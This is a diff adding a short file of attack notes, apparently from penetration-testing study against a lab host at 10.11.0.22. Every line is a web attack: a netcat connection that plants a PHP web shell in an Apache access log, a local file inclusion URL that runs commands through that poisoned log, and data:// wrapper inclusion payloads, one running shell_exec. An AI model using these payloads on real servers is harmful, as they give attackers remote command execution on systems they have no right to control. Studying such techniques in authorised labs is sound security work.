@@ -1,0 +1,15 @@
+#!/usr/bin/peno
+
+#log files poisning
+nc -nv 10.11.0.22 80
+<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+#Using the poisoned log file
+http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+
+#A test payload using the data wrapper
+http://10.11.0.22/menu.php?file=data:text/plain,hello world
+
+#A sample LFI payload using the data wrapper
+http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+
